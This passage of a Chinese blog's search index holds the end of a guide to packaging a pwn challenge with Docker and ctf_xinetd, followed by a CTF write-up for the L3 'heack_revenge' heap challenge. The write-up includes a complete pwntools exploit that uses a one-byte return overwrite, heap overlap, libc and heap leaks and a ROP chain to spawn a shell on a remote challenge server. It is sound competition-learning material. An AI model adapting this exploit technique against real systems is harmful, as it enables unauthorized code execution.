/home/ctf/bin &amp;&amp; \</span><br><span class="line">    cp /bin/cat /home/ctf/bin</span><br><span class="line"></span><br><span class="line">COPY ./ctf.xinetd /etc/xinetd.d/ctf</span><br><span class="line">COPY ./flag.sh /flag.sh</span><br><span class="line">RUN echo &quot;Blocked by ctf_xinetd&quot; &gt; /etc/banner_fail</span><br><span class="line"></span><br><span class="line">RUN chmod +x /flag.sh</span><br><span class="line"></span><br><span class="line">COPY ./bin/ /home/ctf/</span><br><span class="line">RUN chown -R root:ctf /home/ctf &amp;&amp; \</span><br><span class="line">    chmod -R 750 /home/ctf &amp;&amp; \</span><br><span class="line">    chmod 740 /home/ctf/flag</span><br><span class="line"></span><br><span class="line">CMD [&quot;/flag.sh&quot;]</span><br><span class="line"></span><br><span class="line">EXPOSE 80</span><br><span class="line"></span><br></pre></td></tr></table></figure></li><li><p>flag.sh</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#!/bin/sh</span></span><br><span class="line"><span class="comment"># Add your startup script</span></span><br><span class="line"><span class="built_in">echo</span> <span class="variable">$GZCTF_FLAG</span> &gt; /home/ctf/flag</span><br><span class="line"><span class="comment"># 清除环境变量</span></span><br><span class="line"><span class="built_in">unset</span> GZCTF_FLAG</span><br><span class="line"></span><br><span class="line"><span class="comment"># DO NOT DELETE</span></span><br><span class="line">/etc/init.d/xinetd start;</span><br><span class="line"><span class="built_in">sleep</span> infinity;</span><br></pre></td></tr></table></figure></li><li><p>之后</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker build  -t <span class="string">&quot;pwn&quot;</span> .#创建镜像</span><br></pre></td></tr></table></figure></li><li><p>将镜像push到github仓库里</p><ol><li><p>现在github里弄一个Personal access tokens``Tokens(classic)，方便写入</p></li><li><p>bash命令</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">echo</span> your_token | docker login ghcr.io --username your_id --password-stdin <span class="comment">#your_id 为你的github的用户名</span></span><br><span class="line">docker tag name_of_package ghcr.io/your_id/app:latest <span class="comment"># name_of_package为本地已经存在的镜像 app为你将要上传到仓库的名称 latest为标签</span></span><br><span class="line">docker push ghcr.io/your_id/app:latest <span class="comment">#成功push</span></span><br></pre></td></tr></table></figure><p>完成之后便可以在github里看到push进来的镜像了</p><p><img src="https://taotao-1370284040.cos.ap-beijing.myqcloud.com/img/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202025-07-23%20124220.png" alt="屏幕截图 2025-07-23 124220"></p></li></ol></li><li><p>在GZ平台上出题的时候将自己github里的镜像pull到平台里即可，记得按照自己镜像里的端口设置端口号</p><p><img src="https://taotao-1370284040.cos.ap-beijing.myqcloud.com/img/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202025-07-23%20124826.png" alt="屏幕截图 2025-07-23 124826"></p></li></ol><p>参考文章：</p><p><a href="https://skynionkrz.github.io/2024/08/22/出题流程/#0x04-将容器镜像push到github">链接1</a></p><p><a href="https://blog.csdn.net/Myon5/article/details/131763593">链接2</a></p><p><a href="https://xz.aliyun.com/news/13944">链接3</a></p><h2 id="出题完成啦！！！"><a href="#出题完成啦！！！" class="headerlink" title="出题完成啦！！！"></a>出题完成啦！！！</h2>]]></content>
      
      
      
        <tags>
            
            <tag> pwn 出题 ctf_xinetd </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>L3 pwn</title>
      <link href="/2025/07/20/L3-pwn/"/>
      <url>/2025/07/20/L3-pwn/</url>
      
        <content type="html"><![CDATA[<h1 id="heack-revenge"><a href="#heack-revenge" class="headerlink" title="heack_revenge"></a>heack_revenge</h1><p>这个题比赛中没做出来，赛后复现一下</p><ol><li><p>这个题第一步就卡住我了，（<del>我还是太菜了</del>），这个题通过修改索引可以溢出到ret地址，但是最多只能覆盖一个字节，也就是说，要在0x1800~0x1900这段代码内寻找有用的gadget，结果这个题在0x186a这个地方藏了一个pop rbp，这个是解题的关键</p><p><img src="https://taotao-1370284040.cos.ap-beijing.myqcloud.com/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202025-07-20%20230952.png" alt=""></p></li></ol><ol><li><p>通过pop rbp之后，调试可以发现，rbp会指向index为0的chunk，而且可以通过修改hp，attack，可以修改chunk头中的size部分，实现堆叠，堆风水布局可以泄露libc和heap</p><p><img src="https://taotao-1370284040.cos.ap-beijing.myqcloud.com/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202025-07-21%20100010.png" alt=""></p><p>泄露libc后，在上图rbp指向的chunk中写入rop链，ret时便可以劫持程序执行流，get_shell !!!</p><p>exp：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> tty </span><br><span class="line"></span><br><span class="line">context(arch=<span class="string">&quot;amd64&quot;</span>, os=<span class="string">&quot;linux&quot;</span>)</span><br><span class="line">context.log_level=<span class="string">&#x27;debug&#x27;</span></span><br><span class="line">context.terminal = [<span class="string">&quot;tmux&quot;</span>, <span class="string">&quot;splitw&quot;</span>, <span class="string">&quot;-h&quot;</span>, <span class="string">&quot;-l&quot;</span>, <span class="string">&quot;190&quot;</span>]</span><br><span class="line"></span><br><span class="line">libc_base=<span class="number">0x0</span></span><br><span class="line">heap_base=<span class="number">0x0</span></span><br><span class="line">pie=<span class="number">0x0</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">getshell</span>() : <span class="keyword">return</span> libc_base + libc.sym[<span class="string">&#x27;system&#x27;</span>], libc_base + <span class="built_in">next</span>(libc.search(<span class="string">b&#x27;/bin/sh\x00&#x27;</span>))</span><br><span class="line"></span><br><span class="line">r = <span class="keyword">lambda</span> a : p.recv(a)</span><br><span class="line">rl = <span class="keyword">lambda</span>    a=<span class="literal">False</span>        : p.recvline(a)</span><br><span class="line">ru = <span class="keyword">lambda</span> a  : p.recvuntil(a)</span><br><span class="line">s = <span class="keyword">lambda</span> x            : p.send(x)</span><br><span class="line">sl = <span class="keyword">lambda</span> x            : p.sendline(x)</span><br><span class="line">sa = <span class="keyword">lambda</span> a,b            : p.sendafter(a,b)</span><br><span class="line">sla = <span class="keyword">lambda</span> a,b        : p.sendlineafter(a,b)</span><br><span class="line">shell = <span class="keyword">lambda</span>            : p.interactive()</span><br><span class="line">li = <span class="keyword">lambda</span> offset        :libc_base+offset</span><br><span class="line">lis= <span class="keyword">lambda</span> func          :libc_base+libc.symbols[func]</span><br><span class="line">pi = <span class="keyword">lambda</span> offset        :pie+offset</span><br><span class="line">he = <span class="keyword">lambda</span> offset        :heap_base+offset</span><br><span class="line">l32 = <span class="keyword">lambda</span>    :u32(p.recvuntil(<span class="string">b&#x27;\xf7&#x27;</span>)[-<span class="number">4</span>:].ljust(<span class="number">4</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">l64 = <span class="keyword">lambda</span>    :u64(p.recvuntil(<span class="string">b&#x27;\x7f&#x27;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">uu32    = <span class="keyword">lambda</span>    :u32(p.recv(<span class="number">4</span>).ljust(<span class="number">4</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">uu64    = <span class="keyword">lambda</span>    :u64(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">ggg = <span class="keyword">lambda</span>              :(gdb.attach(p),pause())</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">fight</span>(<span class="params">concent</span>):</span><br><span class="line">    ru(<span class="string">b&#x27;&gt; &#x27;</span>)</span><br><span class="line">    sl(<span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">    ru(<span class="string">b&#x27;You grip your sword and shout:&#x27;</span>)</span><br><span class="line">    sl(concent)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">attack</span>():</span><br><span class="line">    ru(<span class="string">b&#x27;&gt; &#x27;</span>)</span><br><span class="line">    sl(<span class="string">b&#x27;2&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">hp</span>():</span><br><span class="line">    ru(<span class="string">b&#x27;&gt; &#x27;</span>)</span><br><span class="line">    sl(<span class="string">b&#x27;3&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">show</span>():</span><br><span class="line">    ru(<span class="string">b&#x27;&gt; &#x27;</span>)</span><br><span class="line">    sl(<span class="string">b&#x27;4&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">note</span>():</span><br><span class="line">    sla(<span class="string">b&#x27;&gt; &#x27;</span>,<span class="string">b&#x27;5&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">index,size,concent</span>):</span><br><span class="line">    sla(<span class="string">b&#x27;Choose an option: &#x27;</span>,<span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">    sla(<span class="string">b&#x27;Enter index (0-15): &#x27;</span>,<span class="built_in">str</span>(index).encode())</span><br><span class="line">    sa(<span class="string">b&#x27;Enter diary content size (1-2048): &#x27;</span>,<span class="built_in">str</span>(size).encode())</span><br><span class="line">    sla(<span class="string">b&#x27;Input your content: &#x27;</span>,concent)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">uaf</span>(<span class="params">index,size</span>):</span><br><span class="line">    <span class="keyword">global</span> p</span><br><span class="line">    sla(<span class="string">b&#x27;Choose an option: &#x27;</span>,<span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">    sla(<span class="string">b&#x27;Enter index (0-15): &#x27;</span>,<span class="built_in">str</span>(index).encode())</span><br><span class="line">    sla(<span class="string">b&#x27;Enter diary content size (1-2048): &#x27;</span>,<span class="built_in">str</span>(size).encode())</span><br><span class="line">    ru(<span class="string">b&#x27;Input your content: &#x27;</span>)</span><br><span class="line">    p.send(<span class="built_in">chr</span>(tty.CEOF))</span><br><span class="line">    ru(<span class="string">b&#x27;Read failed!&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">free</span>(<span class="params">index</span>):</span><br><span class="line">    sla(<span class="string">b&#x27;Choose an option: &#x27;</span>,<span class="string">b&#x27;2&#x27;</span>)</span><br><span class="line">    sla(<span class="string">b&#x27;Enter index to destroy (0-15): &#x27;</span>,<span class="built_in">str</span>(index).encode())</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">view</span>(<span class="params">index</span>):</span><br><span class="line">    sla(<span class="string">b&#x27;Choose an option: &#x27;</span>,<span class="string">b&#x27;3&#x27;</span>)</span><br><span class="line">    sla(<span class="string">b&#x27;Enter index to view (0-15): &#x27;</span>,<span class="built_in">str</span>(index).encode())</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">esc</span>():</span><br><span class="line">    sla(<span class="string">b&#x27;Choose an option: &#x27;</span>,<span class="string">b&#x27;4&#x27;</span>)</span><br><span class="line"></span><br><span class="line">libc=ELF(<span class="string">&#x27;./libc.so.6&#x27;</span>)</span><br><span class="line"><span class="comment">#p = process(&quot;./vul2&quot;)</span></span><br><span class="line">p=remote(<span class="string">&#x27;43.138.2.216&#x27;</span>,<span class="number">19999</span>)</span><br><span class="line">note()</span><br><span class="line">add(<span class="number">3</span>,<span class="number">0x10</span>,<span class="string">b&#x27;a&#x27;</span>)</span><br><span class="line">add(<span class="number">4</span>,<span class="number">0x10</span>,<span class="string">b&#x27;a&#x27;</span>)</span><br><span class="line">add(<span class="number">6</span>,<span class="number">0x10</span>,<span class="string">b&#x27;a&#x27;</span>)</span><br><span class="line">add(<span class="number">7</span>,<span class="number">0x10</span>,<span class="string">b&#x27;a&#x27;</span>)</span><br><span class="line">add(<span class="number">0</span>,<span class="number">0x50</span>,<span class="string">b&#x27;a&#x27;</span>)</span><br><span class="line">add(<span class="number">5</span>,<span class="number">0x400</span>,<span class="string">b&#x27;a&#x27;</span>)</span><br><span class="line">add(<span class="number">10</span>,<span class="number">0x3f0</span>,<span class="string">b&#x27;a&#x27;</span>)</span><br><span class="line">add(<span class="number">13</span>,<span class="number">0x500</span>,<span class="string">b&#x27;a&#x27;</span>)</span><br><span class="line">add(<span class="number">11</span>,<span class="number">0x10</span>,<span class="string">b&#x27;a&#x27;</span>)</span><br><span class="line">free(<span class="number">13</span>)</span><br><span class="line">free(<span class="number">10</span>)</span><br><span class="line">free(<span class="number">3</span>)</span><br><span class="line">esc()</span><br><span class="line">fight(<span class="string">b&#x27;A&#x27;</span> * (<span class="number">259</span> - <span class="number">0xe0</span>) + <span class="string">b&#x27;\x37&#x27;</span> + <span class="string">b&#x27;\x6A&#x27;</span>)</span><br><span class="line">hp()</span><br><span class="line">hp()</span><br><span class="line">hp()</span><br><span class="line">hp()</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">7</span>):</span><br><span class="line">    attack()</span><br><span class="line">note()</span><br><span class="line">view(<span class="number">2</span>)</span><br><span class="line">ru(<span class="string">b&#x27;---\n&#x27;</span>)</span><br><span class="line">heap_base=(u64(p.recv(<span class="number">5</span>).ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>)))&lt;&lt;<span class="number">12</span></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(heap_base))</span><br><span class="line">add(<span class="number">4</span>,<span class="number">0x10</span>,p64(he(<span class="number">0xb90</span>))+p64(he(<span class="number">0x300</span>)))</span><br><span class="line">view(<span class="number">6</span>)</span><br><span class="line">ru(<span class="string">b&#x27;---\n&#x27;</span>)</span><br><span class="line">libc_base=uu64()-<span class="number">0x203b20</span></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(libc_base))</span><br><span class="line">free(<span class="number">7</span>)</span><br><span class="line">rdi=li(<span class="number">0x000000000010f75b</span>)</span><br><span class="line">system,binsh=getshell()</span><br><span class="line">payload=<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x28</span>+p64(rdi+<span class="number">1</span>)*<span class="number">0x81</span>+p64(rdi)+p64(binsh)+p64(system)</span><br><span class="line">add(<span class="number">7</span>,<span class="number">0x480</span>,payload)</span><br><span class="line">esc()</span><br><span class="line">ru(<span class="string">b&#x27;&gt; &#x27;</span>)</span><br><span class="line">sl(<span class="string">b&#x27;6&#x27;</span>)</span><br><span class="line">shell()</span><br></pre></td></tr></table></figure><p>(我的堆风水比较麻烦，官方wp堆风水只需要泄露libc即可，不需要泄露heap，<a href="https://hust-l3hsec.feishu.cn/wiki/WjlUwIAahiXhlykwIe7c5V57nPb">官方wp</a>)</p></li></ol>]]></content>
      
      
      
        <tags>
            
            <tag> pwn </tag>
            
            <tag> 堆 </tag>
            
            <tag> L3 </tag>
            
        </tags>
      
    </entry>
    
    
  
  
</search>
